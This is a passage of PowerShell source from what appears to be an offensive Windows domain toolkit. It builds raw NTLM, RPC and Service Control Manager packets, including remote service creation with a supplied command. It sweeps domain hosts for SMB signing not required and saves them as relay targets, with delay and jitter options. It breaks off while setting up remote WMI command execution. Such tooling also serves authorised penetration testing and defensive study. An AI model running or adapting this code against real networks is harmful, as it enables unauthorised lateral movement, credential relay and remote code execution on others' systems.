        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_version)
        {
            $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)
        }

        return $packet_NTLMSSPNegotiate
    }

    function Get-PacketNTLMSSPAuth()
    {
        param([Byte[]]$packet_NTLM_response)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
        [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
        $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
        [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
        $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
        [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
        $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

        $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

        return $packet_NTLMSSPAuth
    }

    #RPC

    function Get-PacketRPCBind()
    {
        param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

        [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

        $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
        $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
        $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
        $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
        $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
        $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
        $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
        $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
        $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

        if($packet_num_ctx_items[0] -eq 2)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($packet_num_ctx_items[0] -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if($packet_call_ID -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return $packet_RPCBind
    }

    function Get-PacketRPCRequest()
    {
        param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

        if($packet_auth_length -gt 0)
        {
            $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
        }

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
        [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
        $packet_auth_length = $packet_auth_length[0,1]

        $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCRequest.Add("RPCRequest_Version",[Byte[]](0x05))
        $packet_RPCRequest.Add("RPCRequest_VersionMinor",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketType",[Byte[]](0x00))
        $packet_RPCRequest.Add("RPCRequest_PacketFlags",$packet_flags)
        $packet_RPCRequest.Add("RPCRequest_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCRequest.Add("RPCRequest_FragLength",$packet_frag_length)
        $packet_RPCRequest.Add("RPCRequest_AuthLength",$packet_auth_length)
        $packet_RPCRequest.Add("RPCRequest_CallID",$packet_call_ID)
        $packet_RPCRequest.Add("RPCRequest_AllocHint",$packet_alloc_hint)
        $packet_RPCRequest.Add("RPCRequest_ContextID",$packet_context_ID)
        $packet_RPCRequest.Add("RPCRequest_Opnum",$packet_opnum)

        if($packet_data.Length)
        {
            $packet_RPCRequest.Add("RPCRequest_Data",$packet_data)
        }

        return $packet_RPCRequest
    }

    #SCM

    function Get-PacketSCMOpenSCManagerW()
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00

        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("SCMOpenSCManagerW_AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
    
        return $packet_SCMOpenSCManagerW
    }

    function Get-PacketSCMCreateServiceW()
    {
        param([Byte[]]$packet_context_handle,[Byte[]]$packet_service,[Byte[]]$packet_service_length,
                [Byte[]]$packet_command,[Byte[]]$packet_command_length)
                
        $packet_referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID = $packet_referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID += 0x00,0x00

        $packet_SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ReferentID",$packet_referent_ID)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_MaxCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName_ActualCount",$packet_service_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DisplayName",$packet_service)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_MaxCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName_ActualCount",$packet_command_length)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_BinaryPathName",$packet_command)
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMCreateServiceW.Add("SCMCreateServiceW_PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SCMCreateServiceW
    }

    function Get-PacketSCMStartServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMStartServiceW.Add("SCMStartServiceW_ContextHandle",$packet_context_handle)
        $packet_SCMStartServiceW.Add("SCMStartServiceW_Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SCMStartServiceW
    }

    function Get-PacketSCMDeleteServiceW()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMDeleteServiceW.Add("SCMDeleteServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCMDeleteServiceW
    }

    function Get-PacketSCMCloseServiceHandle()
    {
        param([Byte[]]$packet_context_handle)

        $packet_SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCM_CloseServiceW.Add("SCMCloseServiceW_ContextHandle",$packet_context_handle)

        return $packet_SCM_CloseServiceW
    }

    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
    $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
    $process_ID = $process_ID -replace "-00-00",""
    [Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    function Get-SMBSigningStatus
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_version)

        if($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_client_receive = New-Object System.Byte[] 1024
        $SMB_client_stage = "NegotiateSMB"
        
        :SMB_relay_challenge_loop while($SMB_client_stage -ne "exit")
        {
        
            switch ($SMB_client_stage)
            {

                "NegotiateSMB"
                {
                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes 0x00,0x00       
                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                    $SMB_relay_challenge_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                    $SMB_relay_challenge_stream.Flush()    
                    $SMB_relay_challenge_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                    if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq "ff-53-4d-42")
                    {
                        $SMB_version = "SMB1"
                        $SMB_client_stage = "NTLMSSPNegotiate"
                    }
                    else
                    {
                        $SMB_client_stage = "NegotiateSMB2"
                    }

                    if(($SMB_version -eq "SMB1" -and [System.BitConverter]::ToString($SMB_client_receive[39]) -eq "0f") -or ($SMB_version -ne "SMB1" -and [System.BitConverter]::ToString($SMB_client_receive[70]) -eq "03"))
                    {
                        $SMBSigningStatus = $true
                        
                    } else {
                        $SMBSigningStatus = $false
                    }
                    $SMB_relay_socket.Close()
                    $SMB_client_receive = $null
                    $SMB_client_stage = "exit"

                }
            
            }

        }
        return $SMBSigningStatus
    }

    if($Target) {
        $Targets += $Target
    }
    foreach ($Target in $Targets) {
        $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
        $SMB_relay_socket.Client.ReceiveTimeout = $Timeout
        $SMB_relay_socket.Connect($Target,"445")
        $HTTP_client_close = $false
        if(!$SMB_relay_socket.connected)
        {
        "$Target is not responding"
        }
        $SigningStatus = Get-SMBSigningStatus $SMB_relay_socket "smb2"
        if ($SigningStatus){
            "Signing Enabled"
        } else {
            "Signing Not Required"
        }
        if ($Delay) {
            $Jitter = get-random -Minimum 0 -Maximum $DelayJitter
            sleep ($Delay+$Jitter)
        }
    }

}

'@

Function GenRelayList {
Write-output ""

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command, $Timeout, $Signing)

    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    
    if (!$connected) {
        return "Unable to connect"
    }

    IEX $Signing
    return Get-SMBSigning -Target $ComputerName
}


# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Signing)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            try {$result = $result.Trim()} catch {}
            if ($Result -eq "Unable to connect"){
                
                $runspace.Runspace.Dispose()
                $runspace.Handle.AsyncWaitHandle.Close()
                continue

            }

            if ($result -match "Signing Enabled") {
                if ($SuccessOnly) {continue}
                
                else {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                continue
                
                }
            }

            elseif ($result -match "Signing Not Required") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SMB Signing not Required" -NameLength $NameLength -OSLength $OSLength
                $($runspace.ComputerName) | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append -Force -ErrorAction "SilentlyContinue"
                continue
            }

            else  {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            }

            # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Check if the file exists
if (Test-Path "$SMB\SigningNotRequired-$Domain.txt") {
    $Unique = Get-Content "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique
    $Unique | Set-Content "$SMB\SigningNotRequired-$Domain.txt" -Force
} 

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()
 
}


################################################################################################################
############################################ Function: SessionHunter ###########################################
################################################################################################################
Function Invoke-SessionHunter {
Write-host

Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"


# Create a runspace pool
$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param ($computerName, $Command, $Timeout)

    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

    if ($wait) { 
        try {
            $tcpClient.EndConnect($asyncResult)
            $connected = $true
        } catch {
            $connected = $false
        }
    } else {
        $connected = $false
    }

    $tcpClient.Close()
    if (!$connected) {return}
    
    $osInfo = $null
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
    if (!$osInfo){return}


    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)


function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
